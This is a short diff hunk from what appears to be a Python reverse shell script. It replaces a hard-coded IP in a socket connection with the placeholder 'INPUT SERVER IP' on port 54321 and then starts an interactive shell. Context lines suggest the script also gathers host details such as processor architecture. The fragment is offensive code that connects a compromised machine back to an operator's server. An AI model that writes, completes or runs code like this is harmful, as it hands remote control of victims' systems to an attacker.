@@ -70,7 +70,7 @@ Processor Arch.: {platform.processor()}
 
 # Create and connect the socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(('192.168.1.170', 54321))
+sock.connect(('INPUT SERVER IP', 54321))
 
 shell()  # Start the shell interaction
 
